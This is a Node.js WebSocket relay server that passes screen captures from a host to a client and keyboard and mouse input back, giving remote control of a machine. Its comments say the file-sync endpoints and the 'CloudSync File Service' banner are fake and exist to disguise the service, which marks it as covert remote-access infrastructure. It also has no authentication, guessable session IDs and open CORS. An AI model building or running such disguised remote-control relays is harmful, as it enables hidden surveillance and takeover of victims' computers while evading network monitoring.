const express = require('express');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Security and CORS
app.use(helmet());
app.use(cors());
app.use(express.json());

// In-memory session storage (use Redis in production)
const sessions = new Map();
const connections = new Map();

// Disguise as a file sync service
app.get('/', (req, res) => {
  res.json({
    service: "CloudSync File Service",
    version: "1.2.4",
    status: "operational",
    endpoints: {
      files: "/api/files",
      sync: "/api/sync", 
      websocket: "/ws"
    }
  });
});

// Fake file API endpoints for disguise
app.get('/api/files', (req, res) => {
  res.json({
    files: [
      { id: 1, name: "document.pdf", size: "2.4MB", modified: "2025-08-22" },
      { id: 2, name: "presentation.pptx", size: "5.1MB", modified: "2025-08-21" }
    ],
    total: 2
  });
});

app.post('/api/sync', (req, res) => {
  res.json({
    status: "success",
    synced: 15,
    timestamp: new Date().toISOString()
  });
});

// Create session endpoint
app.post('/api/session/create', (req, res) => {
  const sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
  const sessionData = {
    id: sessionId,
    created: Date.now(),
    host: null,
    client: null,
    active: false
  };
  
  sessions.set(sessionId, sessionData);
  
  console.log(`🆕 Session created: ${sessionId}`);
  
  res.json({
    success: true,
    sessionId: sessionId,
    message: "Session created successfully"
  });
});

// Join session endpoint  
app.post('/api/session/join', (req, res) => {
  const { sessionId } = req.body;
  
  if (!sessionId) {
    return res.status(400).json({ success: false, message: "Session ID required" });
  }
  
  const session = sessions.get(sessionId);
  if (!session) {
    return res.status(404).json({ success: false, message: "Session not found" });
  }
  
  res.json({
    success: true,
    message: "Session found, connect to WebSocket",
    sessionId: sessionId
  });
});

// Create HTTP server
const server = app.listen(PORT, () => {
  console.log(`🚀 CloudSync Relay Server running on port ${PORT}`);
  console.log(`📡 WebSocket endpoint: ws://localhost:${PORT}`);
});

// Create WebSocket server
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  const clientId = uuidv4();
  ws.clientId = clientId;
  
  console.log(`🔗 Client connected: ${clientId}`);
  
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data);
      handleMessage(ws, message);
    } catch (error) {
      console.error('❌ Invalid message format:', error.message);
      ws.send(JSON.stringify({ 
        type: 'error', 
        message: 'Invalid message format' 
      }));
    }
  });
  
  ws.on('close', () => {
    console.log(`📴 Client disconnected: ${clientId}`);
    handleDisconnection(ws);
  });
  
  ws.on('error', (error) => {
    console.error(`❌ WebSocket error for ${clientId}:`, error.message);
  });
  
  // Send welcome message
  ws.send(JSON.stringify({
    type: 'connected',
    clientId: clientId,
    message: 'Connected to CloudSync relay'
  }));
});

function handleMessage(ws, message) {
  const { type, sessionId, data } = message;
  
  switch (type) {
    case 'host':
      handleHostConnection(ws, sessionId);
      break;
      
    case 'client':
      handleClientConnection(ws, sessionId);
      break;
      
    case 'screen_data':
      relayToClient(sessionId, { type: 'screen_data', data });
      break;
      
    case 'input_data':
      relayToHost(sessionId, { type: 'input_data', data });
      break;
      
    case 'ping':
      ws.send(JSON.stringify({ type: 'pong' }));
      break;
      
    default:
      console.log(`❓ Unknown message type: ${type}`);
  }
}

function handleHostConnection(ws, sessionId) {
  const session = sessions.get(sessionId);
  if (!session) {
    ws.send(JSON.stringify({ 
      type: 'error', 
      message: 'Session not found' 
    }));
    return;
  }
  
  if (session.host) {
    ws.send(JSON.stringify({ 
      type: 'error', 
      message: 'Session already has a host' 
    }));
    return;
  }
  
  session.host = ws.clientId;
  connections.set(ws.clientId, { ws, role: 'host', sessionId });
  
  console.log(`🖥️  Host joined session: ${sessionId}`);
  
  ws.send(JSON.stringify({
    type: 'host_ready',
    sessionId: sessionId,
    message: 'You are now hosting'
  }));
  
  // Notify client if already connected
  if (session.client) {
    const clientConn = Array.from(connections.values()).find(
      conn => conn.ws.clientId === session.client
    );
    if (clientConn) {
      clientConn.ws.send(JSON.stringify({
        type: 'host_available',
        message: 'Host is now available'
      }));
    }
    session.active = true;
  }
}

function handleClientConnection(ws, sessionId) {
  const session = sessions.get(sessionId);
  if (!session) {
    ws.send(JSON.stringify({ 
      type: 'error', 
      message: 'Session not found' 
    }));
    return;
  }
  
  if (session.client) {
    ws.send(JSON.stringify({ 
      type: 'error', 
      message: 'Session already has a client' 
    }));
    return;
  }
  
  session.client = ws.clientId;
  connections.set(ws.clientId, { ws, role: 'client', sessionId });
  
  console.log(`👀 Client joined session: ${sessionId}`);
  
  ws.send(JSON.stringify({
    type: 'client_ready',
    sessionId: sessionId,
    message: 'Connected to session'
  }));
  
  // Notify host if already connected
  if (session.host) {
    const hostConn = Array.from(connections.values()).find(
      conn => conn.ws.clientId === session.host
    );
    if (hostConn) {
      hostConn.ws.send(JSON.stringify({
        type: 'client_connected',
        message: 'Client connected to your session'
      }));
    }
    session.active = true;
    console.log(`✅ Session ${sessionId} is now active`);
  }
}

function relayToClient(sessionId, message) {
  const session = sessions.get(sessionId);
  if (!session || !session.client) return;
  
  const clientConn = Array.from(connections.values()).find(
    conn => conn.ws.clientId === session.client
  );
  
  if (clientConn && clientConn.ws.readyState === WebSocket.OPEN) {
    clientConn.ws.send(JSON.stringify(message));
  }
}

function relayToHost(sessionId, message) {
  const session = sessions.get(sessionId);
  if (!session || !session.host) return;
  
  const hostConn = Array.from(connections.values()).find(
    conn => conn.ws.clientId === session.host
  );
  
  if (hostConn && hostConn.ws.readyState === WebSocket.OPEN) {
    hostConn.ws.send(JSON.stringify(message));
  }
}

function handleDisconnection(ws) {
  const connection = connections.get(ws.clientId);
  if (!connection) return;
  
  const { sessionId, role } = connection;
  const session = sessions.get(sessionId);
  
  if (session) {
    if (role === 'host') {
      session.host = null;
    } else if (role === 'client') {
      session.client = null;
    }
    
    session.active = session.host && session.client;
    
    // Notify the other party
    if (role === 'host' && session.client) {
      relayToClient(sessionId, { type: 'host_disconnected' });
    } else if (role === 'client' && session.host) {
      relayToHost(sessionId, { type: 'client_disconnected' });
    }
    
    // Clean up empty sessions
    if (!session.host && !session.client) {
      sessions.delete(sessionId);
      console.log(`🗑️  Cleaned up empty session: ${sessionId}`);
    }
  }
  
  connections.delete(ws.clientId);
}

// Cleanup old sessions every 5 minutes
setInterval(() => {
  const now = Date.now();
  const maxAge = 30 * 60 * 1000; // 30 minutes
  
  for (const [sessionId, session] of sessions.entries()) {
    if (now - session.created > maxAge && !session.active) {
      sessions.delete(sessionId);
      console.log(`🧹 Cleaned up old session: ${sessionId}`);
    }
  }
}, 5 * 60 * 1000);

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    uptime: process.uptime(),
    sessions: sessions.size,
    connections: connections.size,
    memory: process.memoryUsage()
  });
});

console.log('🌐 CloudSync Relay Server initialized');
console.log('🔐 All connections will be encrypted via WSS in production');
